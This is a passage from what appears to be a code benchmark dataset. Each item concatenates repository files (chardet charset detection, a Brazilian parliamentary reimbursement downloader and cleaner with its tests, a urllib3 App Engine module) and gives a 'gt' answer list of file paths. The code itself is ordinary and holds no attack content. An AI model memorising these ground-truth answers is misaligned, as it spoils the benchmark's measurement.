__init__(self):\n        CharSetProber.__init__(self)\n        self._mCodingSM = [\n            CodingStateMachine(HZSMModel),\n            CodingStateMachine(ISO2022CNSMModel),\n            CodingStateMachine(ISO2022JPSMModel),\n            CodingStateMachine(ISO2022KRSMModel)\n        ]\n        self.reset()\n\n    def reset(self):\n        CharSetProber.reset(self)\n        for codingSM in self._mCodingSM:\n            if not codingSM:\n                continue\n            codingSM.active = True\n            codingSM.reset()\n        self._mActiveSM = len(self._mCodingSM)\n        self._mDetectedCharset = None\n\n    def get_charset_name(self):\n        return self._mDetectedCharset\n\n    def get_confidence(self):\n        if self._mDetectedCharset:\n            return 0.99\n        else:\n            return 0.00\n\n    def feed(self, aBuf):\n        for c in aBuf:\n\n            for codingSM in self._mCodingSM:\n                if not codingSM:\n                    continue\n                if not codingSM.active:\n                    continue\n                codingState = codingSM.next_state(wrap_ord(c))\n                if codingState == constants.eError:\n                    codingSM.active = False\n                    self._mActiveSM -= 1\n                    if self._mActiveSM <= 0:\n                        self._mState = constants.eNotMe\n                        return self.get_state()\n                elif codingState == constants.eItsMe:\n                    self._mState = constants.eFoundIt\n                    self._mDetectedCharset = codingSM.get_coding_state_machine()\n                    return self.get_state()\n\n        return self.get_state()\n\n'PlugAPI4Py/requests/packages/chardet/universaldetector.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport sys\nimport codecs\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\nfrom .escprober import EscCharSetProber\nimport re\n\nMINIMUM_THRESHOLD = 0.20\nePureAscii = 0\neEscAscii = 1\neHighbyte = 2\n\n\nclass UniversalDetector:\n    def __init__(self):\n        self._highBitDetector = re.compile(b'[\\x80-\\xFF]')\n        self._escDetector = re.compile(b'(\\033|~{)')\n        self._mEscCharSetProber = None\n        self._mCharSetProbers = []\n        self.reset()\n\n    def reset(self):\n        self.result = {'encoding': None, 'confidence': 0.0}\n        self.done = False\n        self._mStart = True\n        self._mGotData = False\n        self._mInputState = ePureAscii\n        self._mLastChar = b''\n        if self._mEscCharSetProber:\n            self._mEscCharSetProber.reset()\n        for prober in self._mCharSetProbers:\n            prober.reset()\n\n    def feed(self, aBuf):\n        if self.done:\n            return\n\n        aLen = len(aBuf)\n        if not aLen:\n            return\n\n        if not self._mGotData:\n\n            if aBuf[:3] == codecs.BOM_UTF8:\n\n                self.result = {'encoding': \"UTF-8-SIG\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_LE:\n\n                self.result = {'encoding': \"UTF-32LE\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_BE:\n\n                self.result = {'encoding': \"UTF-32BE\", 'confidence': 1.0}\n            elif aBuf[:4] == b'\\xFE\\xFF\\x00\\x00':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-3412\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:4] == b'\\x00\\x00\\xFF\\xFE':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-2143\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:2] == codecs.BOM_LE:\n\n                self.result = {'encoding': \"UTF-16LE\", 'confidence': 1.0}\n            elif aBuf[:2] == codecs.BOM_BE:\n\n                self.result = {'encoding': \"UTF-16BE\", 'confidence': 1.0}\n\n        self._mGotData = True\n        if self.result['encoding'] and (self.result['confidence'] > 0.0):\n            self.done = True\n            return\n\n        if self._mInputState == ePureAscii:\n            if self._highBitDetector.search(aBuf):\n                self._mInputState = eHighbyte\n            elif ((self._mInputState == ePureAscii) and\n                    self._escDetector.search(self._mLastChar + aBuf)):\n                self._mInputState = eEscAscii\n\n        self._mLastChar = aBuf[-1:]\n\n        if self._mInputState == eEscAscii:\n            if not self._mEscCharSetProber:\n                self._mEscCharSetProber = EscCharSetProber()\n            if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:\n                self.result = {'encoding': self._mEscCharSetProber.get_charset_name(),\n                               'confidence': self._mEscCharSetProber.get_confidence()}\n                self.done = True\n        elif self._mInputState == eHighbyte:\n            if not self._mCharSetProbers:\n                self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),\n                                         Latin1Prober()]\n            for prober in self._mCharSetProbers:\n                if prober.feed(aBuf) == constants.eFoundIt:\n                    self.result = {'encoding': prober.get_charset_name(),\n                                   'confidence': prober.get_confidence()}\n                    self.done = True\n                    break\n\n    def close(self):\n        if self.done:\n            return\n        if not self._mGotData:\n            if constants._debug:\n                sys.stderr.write('no data received!\\n')\n            return\n        self.done = True\n\n        if self._mInputState == ePureAscii:\n            self.result = {'encoding': 'ascii', 'confidence': 1.0}\n            return self.result\n\n        if self._mInputState == eHighbyte:\n            proberConfidence = None\n            maxProberConfidence = 0.0\n            maxProber = None\n            for prober in self._mCharSetProbers:\n                if not prober:\n                    continue\n                proberConfidence = prober.get_confidence()\n                if proberConfidence > maxProberConfidence:\n                    maxProberConfidence = proberConfidence\n                    maxProber = prober\n            if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):\n                self.result = {'encoding': maxProber.get_charset_name(),\n                               'confidence': maxProber.get_confidence()}\n                return self.result\n\n        if constants._debug:\n            sys.stderr.write('no probers hit minimum threshhold\\n')\n            for prober in self._mCharSetProbers[0].mProbers:\n                if not prober:\n                    continue\n                sys.stderr.write('%s confidence = %s\\n' %\n                                 (prober.get_charset_name(),\n                                  prober.get_confidence()))\n\n'PlugAPI4Py/requests/packages/chardet/escsm.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .constants import eStart, eError, eItsMe\n\nHZ_cls = (\n1,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,4,0,5,2,0,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n1,1,1,1,1,1,1,1,\n)\n\nHZ_st = (\neStart,eError,     3,eStart,eStart,eStart,eError,eError,\neError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,\neItsMe,eItsMe,eError,eError,eStart,eStart,     4,eError,\n     5,eError,     6,eError,     5,     5,     4,eError,\n     4,eError,     4,     4,     4,eError,     4,eError,\n     4,eItsMe,eStart,eStart,eStart,eStart,eStart,eStart,\n)\n\nHZCharLenTable = (0, 0, 0, 0, 0, 0)\n\nHZSMModel = {'classTable': HZ_cls,\n             'classFactor': 6,\n             'stateTable': HZ_st,\n             'charLenTable': HZCharLenTable,\n             'name': \"HZ-GB-2312\"}\n\nISO2022CN_cls = (\n2,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,3,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,4,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n)\n\nISO2022CN_st = (\neStart,     3,eError,eStart,eStart,eStart,eStart,eStart,\neStart,eError,eError,eError,eError,eError,eError,eError,\neError,eError,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,\neItsMe,eItsMe,eItsMe,eError,eError,eError,     4,eError,\neError,eError,eError,eItsMe,eError,eError,eError,eError,\n     5,     6,eError,eError,eError,eError,eError,eError,\neError,eError,eError,eItsMe,eError,eError,eError,eError,\neError,eError,eError,eError,eError,eItsMe,eError,eStart,\n)\n\nISO2022CNCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0)\n\nISO2022CNSMModel = {'classTable': ISO2022CN_cls,\n                    'classFactor': 9,\n                    'stateTable': ISO2022CN_st,\n                    'charLenTable': ISO2022CNCharLenTable,\n                    'name': \"ISO-2022-CN\"}\n\nISO2022JP_cls = (\n2,0,0,0,0,0,0,0,\n0,0,0,0,0,0,2,2,\n0,0,0,0,0,0,0,0,\n0,0,0,1,0,0,0,0,\n0,0,0,0,7,0,0,0,\n3,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n6,0,4,0,8,0,0,0,\n0,9,5,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n)\n\nISO2022JP_st = (\neStart,     3,eError,eStart,eStart,eStart,eStart,eStart,\neStart,eStart,eError,eError,eError,eError,eError,eError,\neError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,\neItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,\neError,     5,eError,eError,eError,     4,eError,eError,\neError,eError,eError,     6,eItsMe,eError,eItsMe,eError,\neError,eError,eError,eError,eError,eError,eItsMe,eItsMe,\neError,eError,eError,eItsMe,eError,eError,eError,eError,\neError,eError,eError,eError,eItsMe,eError,eStart,eStart,\n)\n\nISO2022JPCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0)\n\nISO2022JPSMModel = {'classTable': ISO2022JP_cls,\n                    'classFactor': 10,\n                    'stateTable': ISO2022JP_st,\n                    'charLenTable': ISO2022JPCharLenTable,\n                    'name': \"ISO-2022-JP\"}\n\nISO2022KR_cls = (\n2,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,1,0,0,0,0,\n0,0,0,0,3,0,0,0,\n0,4,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,5,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n2,2,2,2,2,2,2,2,\n)\n\nISO2022KR_st = (\neStart,     3,eError,eStart,eStart,eStart,eError,eError,\neError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,\neItsMe,eItsMe,eError,eError,eError,     4,eError,eError,\neError,eError,eError,eError,     5,eError,eError,eError,\neError,eError,eError,eItsMe,eStart,eStart,eStart,eStart,\n)\n\nISO2022KRCharLenTable = (0, 0, 0, 0, 0, 0)\n\nISO2022KRSMModel = {'classTable': ISO2022KR_cls,\n                    'classFactor': 6,\n                    'stateTable': ISO2022KR_st,\n                    'charLenTable': ISO2022KRCharLenTable,\n                    'name': \"ISO-2022-KR\"}\n\n\n\n'PlugAPI4Py/requests/packages/chardet/constants.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n_debug = 0\n\neDetecting = 0\neFoundIt = 1\neNotMe = 2\n\neStart = 0\neError = 1\neItsMe = 2\n\nSHORTCUT_THRESHOLD = 0.95\n",
        "gt": [
            "'PlugAPI4Py/requests/packages/chardet/constants.py'",
            "'PlugAPI4Py/requests/packages/chardet/escsm.py'",
            "'PlugAPI4Py/requests/packages/chardet/escprober.py'",
            "'PlugAPI4Py/requests/packages/chardet/universaldetector.py'",
            "'PlugAPI4Py/requests/packages/chardet/chardetect.py'"
        ]
    },
    {
        "files": [
            "'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements.py'",
            "'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements_cleaner.py'",
            "'serenata-toolbox/tests/unit/chambers_of_deputies/test_reimbursements.py'"
        ],
        "content": "'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements.py'\n:import os\nfrom urllib.request import urlretrieve\nfrom zipfile import ZipFile\n\nfrom .reimbursements_cleaner import ReimbursementsCleaner\n\nURL = 'https://www.camara.leg.br/cotas/Ano-{}.csv.zip'\n\n\ndef extract_zip(zip_path, destination_path):\n    zip_file = ZipFile(zip_path, 'r')\n    zip_file.extractall(destination_path)\n    zip_file.close()\n\n\nclass Reimbursements:\n\n\n    def __init__(self, year='2018', path='data'):\n        self.year = year\n        if not os.path.isdir(path):\n            os.mkdir(os.path.join(path))\n        self.path = path\n\n    def __call__(self):\n        self.fetch()\n        self.clean()\n        file_path = os.path.join(self.path, f'reimbursements-{self.year}.csv')\n        return file_path\n\n    def fetch(self):\n        file_path = os.path.join(self.path, f'Ano-{self.year}.zip')\n        urlretrieve(URL.format(self.year), file_path)\n        extract_zip(file_path, self.path)\n\n    def clean(self):\n        ReimbursementsCleaner(self.year, self.path)()\n\n'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements_cleaner.py'\n:import csv\nimport os.path\n\nimport numpy as np\nimport pandas as pd\n\n\nCOLUMNS = {\n    'txNomeParlamentar': 'congressperson_name',\n    'ideCadastro': 'congressperson_id',\n    'nuCarteiraParlamentar': 'congressperson_document',\n    'nuLegislatura': 'term',\n    'sgUF': 'state',\n    'sgPartido': 'party',\n    'codLegislatura': 'term_id',\n    'numSubCota': 'subquota_number',\n    'txtDescricao': 'subquota_description',\n    'numEspecificacaoSubCota': 'subquota_group_id',\n    'txtDescricaoEspecificacao': 'subquota_group_description',\n    'txtFornecedor': 'supplier',\n    'txtCNPJCPF': 'cnpj_cpf',\n    'txtNumero': 'document_number',\n    'indTipoDocumento': 'document_type',\n    'datEmissao': 'issue_date',\n    'vlrDocumento': 'document_value',\n    'vlrGlosa': 'remark_value',\n    'vlrLiquido': 'net_value',\n    'numMes': 'month',\n    'numAno': 'year',\n    'numParcela': 'installment',\n    'txtPassageiro': 'passenger',\n    'txtTrecho': 'leg_of_the_trip',\n    'numLote': 'batch_number',\n    'numRessarcimento': 'reimbursement_number',\n    'vlrRestituicao': 'reimbursement_value',\n    'nuDeputadoId': 'applicant_id',\n    'ideDocumento': 'document_id',\n}\nSUBQUOTAS = (\n    ('1', 'Maintenance of office supporting parliamentary activity'),\n    ('2', 'Locomotion, meal and lodging'),\n    ('3', 'Fuels and lubricants'),\n    ('4', 'Consultancy, research and technical work'),\n    ('5', 'Publicity of parliamentary activity'),\n    ('6', 'Purchase of office supplies'),\n    ('7', 'Software purchase or renting; Postal services; Subscriptions'),\n    ('8', 'Security service provided by specialized company'),\n    ('9', 'Flight tickets'),\n    ('10', 'Telecommunication'),\n    ('11', 'Postal services'),\n    ('12', 'Publication subscriptions'),\n    ('13', 'Congressperson meal'),\n    ('14', 'Lodging, except for congressperson from Distrito Federal'),\n    ('15', 'Automotive vehicle renting or watercraft charter'),\n    ('119', 'Aircraft renting or charter of aircraft'),\n    ('120', 'Automotive vehicle renting or charter'),\n    ('121', 'Watercraft renting or charter'),\n    ('122', 'Taxi, toll and parking'),\n    ('123', 'Terrestrial, maritime and fluvial tickets'),\n    ('137', 'Participation in course, talk or similar event'),\n    ('999', 'Flight ticket issue')\n)\nDTYPE = {\n    'txNomeParlamentar': np.str,\n    'ideCadastro': np.str,\n    'nuCarteiraParlamentar': np.str,\n    'nuLegislatura': np.str,\n    'sgUF': np.str,\n    'sgPartido': np.str,\n    'codLegislatura': np.str,\n    'numSubCota': np.str,\n    'txtDescricao': np.str,\n    'numEspecificacaoSubCota': np.str,\n    'txtDescricaoEspecificacao': np.str,\n    'txtFornecedor': np.str,\n    'txtCNPJCPF': np.str,\n    'txtNumero': np.str,\n    'indTipoDocumento': np.str,\n    'datEmissao': np.str,\n    'vlrDocumento': np.float,\n    'vlrGlosa': np.str,\n    'vlrLiquido': np.float,\n    'numMes': np.str,\n    'numAno': np.str,\n    'numParcela': np.str,\n    'txtPassageiro': np.str,\n    'txtTrecho': np.str,\n    'numLote': np.str,\n    'numRessarcimento': np.str,\n    'nuDeputadoId': np.str,\n    'ideDocumento': np.str,\n}\nKEY = 'document_id'\nAGGREGATED_COLS = {\n    'reimbursement_number': 'numbers',\n    'net_value': 'total_net_value',\n    'reimbursement_value': 'total_value',\n}\n\n\nclass ReimbursementsCleaner:\n\n\n    def __init__(self, year, path):\n        self.year = year\n        self.path = path\n        self.data = None\n\n    def __call__(self):\n        self.load_source_file()\n        self.translate()\n        self.aggregate_multiple_payments()\n        self.cleanup()\n        self.save()\n\n    def load_source_file(self):\n        file_path = os.path.join(self.path, f'Ano-{self.year}.csv')\n        self.data = pd.read_csv(file_path,\n                                delimiter=';',\n                                dtype=DTYPE,\n                                low_memory=False)\n\n    def translate(self):\n        self.data.rename(columns=COLUMNS, inplace=True)\n        for code, name in SUBQUOTAS:\n            rows = self.data['subquota_number'] == code\n            self.data.loc[rows, 'subquota_description'] = name\n\n    def aggregate_multiple_payments(self):\n        self.data = pd.concat([\n            self._house_payments(),\n            self._non_house_payments()\n        ], sort=False)\n\n    def cleanup(self):\n        if self.data is None:\n            return\n        self.data['cnpj_cpf'] = self.data['cnpj_cpf'].str.replace(r'\\D', '')\n\n        translated = set(COLUMNS.values())\n        aggregated = set(AGGREGATED_COLS.values())\n        to_drop = set(self.data.columns) - translated.union(aggregated)\n        if to_drop:\n            self.data.drop(columns=to_drop, inplace=True)\n\n    def save(self):\n        file_path = os.path.join(self.path, f'reimbursements-{self.year}.csv')\n        self.data.to_csv(file_path, index=False)\n\n    def _house_payments(self):\n        data = self.data[self.data['reimbursement_number'] == '0'].copy()\n        data.rename(columns=AGGREGATED_COLS, inplace=True)\n        data['numbers'] = data['numbers'].apply(lambda val: [val])\n        return data\n\n    def _non_house_payments(self):\n        data = self.data[self.data['reimbursement_number'] != '0'].copy()\n        data.rename(columns=AGGREGATED_COLS, inplace=True)\n        attributes = {\n            key: 'first' for key in data.columns\n            if key is not KEY\n        }\n        attributes['numbers'] = list\n        attributes['total_net_value'] = 'sum'\n        attributes['total_value'] = 'sum'\n        return data.groupby(KEY, as_index=False).agg(attributes)\n\n'serenata-toolbox/tests/unit/chambers_of_deputies/test_reimbursements.py'\n:import os.path\nfrom unittest import TestCase\nfrom unittest.mock import patch\n\nfrom serenata_toolbox.chamber_of_deputies.reimbursements import \\\n    URL, Reimbursements\n\n\nclass TestReimbursements(TestCase):\n    def setUp(self):\n        self.subject = Reimbursements(2017)\n\n    @patch.object(Reimbursements, 'fetch')\n    @patch.object(Reimbursements, 'clean')\n    def test_call_fetch_and_clean(self, clean_mock, fetch_mock):\n        self.subject()\n        fetch_mock.assert_called_with()\n        clean_mock.assert_called_with()\n\n    @patch.object(Reimbursements, 'fetch')\n    @patch.object(Reimbursements, 'clean')\n    def test_call_return_file_path(self, _clean_mock, _fetch_mock):\n        file_path = os.path.join(self.subject.path, 'reimbursements-2017.csv')\n        self.assertEqual(file_path, self.subject())\n\n    @patch('serenata_toolbox.chamber_of_deputies.reimbursements.extract_zip')\n    @patch('serenata_toolbox.chamber_of_deputies.reimbursements.urlretrieve')\n    def test_fetch_download_zip_file(self, urlretrieve_mock, _):\n        url = URL.format(2017)\n        path = os.path.join(self.subject.path, 'Ano-2017.zip')\n        self.subject.fetch()\n        urlretrieve_mock.assert_called_with(url, path)\n\n    @patch('serenata_toolbox.chamber_of_deputies.reimbursements.extract_zip')\n    @patch('serenata_toolbox.chamber_of_deputies.reimbursements.urlretrieve')\n    def test_fetch_extract_zip(self, _, extract_zip_mock):\n        file_path = os.path.join(self.subject.path, 'Ano-2017.zip')\n        path = self.subject.path\n        self.subject.fetch()\n        extract_zip_mock.assert_called_with(file_path, path)\n\n    @patch('serenata_toolbox.chamber_of_deputies.reimbursements.ReimbursementsCleaner')\n    def test_clean_delegate_to_reimbursements_cleaner(self, cleaner_mock):\n        self.subject.clean()\n        cleaner_mock.return_value.assert_called_with()\n",
        "gt": [
            "'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements_cleaner.py'",
            "'serenata-toolbox/serenata_toolbox/chamber_of_deputies/reimbursements.py'",
            "'serenata-toolbox/tests/unit/chambers_of_deputies/test_reimbursements.py'"
        ]
    },
    {
        "files": [
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/contrib/appengine.py'",
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/filepost.py'",
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/request.py'"
        ],
        "content": "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/contrib/appengine.py'\n:\"\"\"\nThis module provides a pool manager that uses Google App Engine's\n`URLFetch Service <https://cloud.google.com/appengine/docs/python/urlfetch>`_.\n\nExample usage::\n\n    from urllib3 import PoolManager\n    from urllib3.contrib.appengine import AppEngineManager, is_appengine_sandbox\n\n    if is_appengine_sandbox():\n\n        http = AppEngineManager()\n    else:\n\n        http = PoolManager()\n\n    r = http.request('GET', 'https://google.com/')\n\nThere are `limitations <https://cloud.google.com/appengine/docs/python/\\\nurlfetch/\nthe best choice for your application. There are three options for using\nurllib3 on Google App Engine:\n\n1. You can use :class:`AppEngineManager` with URLFetch. URLFetch is\n   cost-effective in many circumstances as long as your usage is within the\n   limitations.\n2. You can use a normal :class:`~urllib3.PoolManager` by enabling sockets.\n   Sockets also have `limitations and restrictions\n   <https://cloud.google.com/appengine/docs/python/sockets/\\\n\n   To use sockets, be sure to specify the following in your ``app.yaml``::\n\n        env_variables:\n            GAE_USE_SOCKETS_HTTPLIB : 'true'\n\n3. If you are using `App Engine Flexible\n<https://cloud.google.com/appengine/docs/flexible/>`_, you can use the standard\n:class:`PoolManager` without any configuration or special environment variables.\n\n    Connection manager for Google App Engine sandbox applications.\n\n    This manager uses the URLFetch service directly instead of using the\n    emulated httplib, and is subject to URLFetch limitations as described in\n    the App Engine documentation `here\n    <https://cloud.google.com/appengine/docs/python/urlfetch>`_.\n\n    Notably it will raise an :class:`AppEnginePlatformError` if:\n        * URLFetch is not available.\n        * If you attempt to use this on App Engine Flexible, as full socket\n          support is available.\n        * If a request size is more than 10 megabytes.\n        * If a response size is more than 32 megabytes.\n        * If you use an unsupported request method such as OPTIONS.\n\n    Beyond those cases, it will raise normal urllib3 errors.\n    \"\"\"\n\n    def __init__(\n        self,\n        headers=None,\n        retries=None,\n        validate_certificate=True,\n        urlfetch_retries=True,\n    ):\n        if not urlfetch:\n            raise AppEnginePlatformError(\n                \"URLFetch is not available in this environment.\"\n            )\n\n        warnings.warn(\n            \"urllib3 is using URLFetch on Google App Engine sandbox instead \"\n            \"of sockets. To use sockets directly instead of URLFetch see \"\n            \"https://urllib3.readthedocs.io/en/1.26.x/reference/urllib3.contrib.html.\",\n            AppEnginePlatformWarning,\n        )\n\n        RequestMethods.__init__(self, headers)\n        self.validate_certificate = validate_certificate\n        self.urlfetch_retries = urlfetch_retries\n\n        self.retries = retries or Retry.DEFAULT\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n\n        return False\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        **response_kw\n    ):\n\n        retries = self._get_retries(retries, redirect)\n\n        try:\n            follow_redirects = redirect and retries.redirect != 0 and retries.total\n            response = urlfetch.fetch(\n                url,\n                payload=body,\n                method=method,\n                headers=headers or {},\n                allow_truncated=False,\n                follow_redirects=self.urlfetch_retries and follow_redirects,\n                deadline=self._get_absolute_timeout(timeout),\n                validate_certificate=self.validate_certificate,\n            )\n        except urlfetch.DeadlineExceededError as e:\n            raise TimeoutError(self, e)\n\n        except urlfetch.InvalidURLError as e:\n            if \"too large\" in str(e):\n                raise AppEnginePlatformError(\n                    \"URLFetch request too large, URLFetch only \"\n                    \"supports requests up to 10mb in size.\",\n                    e,\n                )\n            raise ProtocolError(e)\n\n        except urlfetch.DownloadError as e:\n            if \"Too many redirects\" in str(e):\n                raise MaxRetryError(self, url, reason=e)\n            raise ProtocolError(e)\n\n        except urlfetch.ResponseTooLargeError as e:\n            raise AppEnginePlatformError(\n                \"URLFetch response too large, URLFetch only supports\"\n                \"responses up to 32mb in size.\",\n                e,\n            )\n\n        except urlfetch.SSLCertificateError as e:\n            raise SSLError(e)\n\n        except urlfetch.InvalidMethodError as e:\n            raise AppEnginePlatformError(\n                \"URLFetch does not support method: %s\" % method, e\n            )\n\n        http_response = self._urlfetch_response_to_http_response(\n            response, retries=retries, **response_kw\n        )\n\n\n        redirect_location = redirect and http_response.get_redirect_location()\n        if redirect_location:\n\n            if self.urlfetch_retries and retries.raise_on_redirect:\n                raise MaxRetryError(self, url, \"too many redirects\")\n            else:\n                if http_response.status == 303:\n                    method = \"GET\"\n\n                try:\n                    retries = retries.increment(\n                        method, url, response=http_response, _pool=self\n                    )\n                except MaxRetryError:\n                    if retries.raise_on_redirect:\n                        raise MaxRetryError(self, url, \"too many redirects\")\n                    return http_response\n\n                retries.sleep_for_retry(http_response)\n                log.debug(\"Redirecting %s -> %s\", url, redirect_location)\n                redirect_url = urljoin(url, redirect_location)\n                return self.urlopen(\n                    method,\n                    redirect_url,\n                    body,\n                    headers,\n                    retries=retries,\n                    redirect=redirect,\n                    timeout=timeout,\n                    **response_kw\n                )\n\n\n        has_retry_after = bool(http_response.headers.get(\"Retry-After\"))\n        if retries.is_retry(method, http_response.status, has_retry_after):\n            retries = retries.increment(method, url, response=http_response, _pool=self)\n            log.debug(\"Retry: %s\", url)\n            retries.sleep(http_response)\n            return self.urlopen(\n                method,\n                url,\n                body=body,\n                headers=headers,\n                retries=retries,\n                redirect=redirect,\n                timeout=timeout,\n                **response_kw\n            )\n\n        return http_response\n\n    def _urlfetch_response_to_http_response(self, urlfetch_resp, **response_kw):\n\n        if is_prod_appengine():\n\n\n            content_encoding = urlfetch_resp.headers.get(\"content-encoding\")\n\n            if content_encoding == \"deflate\":\n                del urlfetch_resp.headers[\"content-encoding\"]\n\n        transfer_encoding = urlfetch_resp.headers.get(\"transfer-encoding\")\n\n\n        if transfer_encoding == \"chunked\":\n            encodings = transfer_encoding.split(\",\")\n            encodings.remove(\"chunked\")\n            urlfetch_resp.headers[\"transfer-encoding\"] = \",\".join(encodings)\n\n        original_response = HTTPResponse(\n\n\n            body=io.BytesIO(urlfetch_resp.content),\n            msg=urlfetch_resp.header_msg,\n            headers=urlfetch_resp.headers,\n            status=urlfetch_resp.status_code,\n            **response_kw\n        )\n\n        return HTTPResponse(\n            body=io.BytesIO(urlfetch_resp.content),\n            headers=urlfetch_resp.headers,\n            status=urlfetch_resp.status_code,\n            original_response=original_response,\n            **response_kw\n        )\n\n    def _get_absolute_timeout(self, timeout):\n        if timeout is Timeout.DEFAULT_TIMEOUT:\n            return None\n        if isinstance(timeout, Timeout):\n            if timeout._read is not None or timeout._connect is not None:\n                warnings.warn(\n                    \"URLFetch does not support granular timeout settings, \"\n                    \"reverting to total or default URLFetch timeout.\",\n                    AppEnginePlatformWarning,\n                )\n            return timeout.total\n        return timeout\n\n    def _get_retries(self, retries, redirect):\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, 